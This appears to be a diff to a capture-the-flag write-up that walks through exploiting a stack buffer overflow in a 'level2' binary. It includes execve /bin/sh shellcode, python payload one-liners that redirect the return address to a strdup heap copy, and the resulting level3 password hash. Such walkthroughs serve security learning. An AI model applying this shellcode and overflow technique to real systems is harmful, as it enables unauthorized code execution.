@@ -92,14 +92,82 @@ so what's the failure points between the first instruction of the function `p` t
 
 well that's the case here, that's great
 
-let's get back but why do we choose this path maybe the other branch is better, because what is beign passted to printf is controlled I can not change it
+let's get back but why do we choose this path maybe the other branch is better, because what is beign passed to printf is controlled I can not change it
 
+#### Other Path
+well now I believe I can put shell code on the stack, and make the condition `jne` false so we jump to lower instruction, which BTW that location is below `exit` which means ret will be excuted which is great for me
 
-### Stopped at this
+![](./pics/23.png)
+
+better passed `exit`
+
+so here's rough idea of what I inted to do
+
+![](./pics/24.png)
+
+what about `strdup` well I do not care, for now at least
+
+### Why I think will work
+
+well we will reach leave/ret, which will take address `bf ff f6 dc` that we overwrite, and jump to it where I put shell code before
+
+here's shell code that's I just copied from a website
+
 ```
-```
-python -c "from __future__ import print_function; print('A'*80 + '\x00\x00\x00\xb0', end='')"
-```
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
 ```
 
-I  should check the other path the strdup way
+with length of 21 bytes, and in order to reach the top of stack which is 80 from the current location is 80-21 = 59
+
+```
+python -c "from __future__ import print_function; print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'+ 'A'*59 + '\xdc\x\f6\xff\xbf', end='')"
+```
+
+you can see ther's the shell code at `0xbffff6dc`, and top of the stack is pointing to it?
+
+![](./pics/25.png)
+![](./pics/26.png)
+
+done?
+
+![](./pics/27.png)
+
+as you can see `eax` will be `oxbffff6dc` and why is this probelm,
+
+excuting these instructions
+```
+and eax, 0xb0000000 => eax = 0xb0000000
+cmp eax, 0xb0000000 => set the flags that cmp was success
+jne would fail and we would continue without jumping, and we encounter that exit again
+```
+
+what can we do now, well checksec reported that there's no aslr, can we use this information?
+
+![](./pisc/../pics/28.png)
+
+well if we can put our shell at the location `0x0804a008` that was returned by `strdup` and we overwirte the stack to point to it, maybe that will work, and this would avoid that `jne` becuase the value `0x0804a008` does not contain 0xb at first
+
+but the problem now how can we put our shell in that location?
+
+well the input to `strdup` is the location where to read from if we can force that to point to the location of our stack that would be great
+
+![](./pics/29.png)
+
+well as you can see we don't even to do that, becuase `strdup` already does that
+
+### Finlay payload
+
+```
+python -c "from __future__ import print_function; print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'+ 'A'*59 + '\x08\xa0\x04\x08', end='')"
+```
+
+### Level 3 passowrd
+
+```
+cat payload - | ./level2
+cat /home/user/level3/.pass
+
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+
+again why `-` well if you remove cat will just output payload to level2 and done so ./level2 has nothing to read, so the shell will be closed
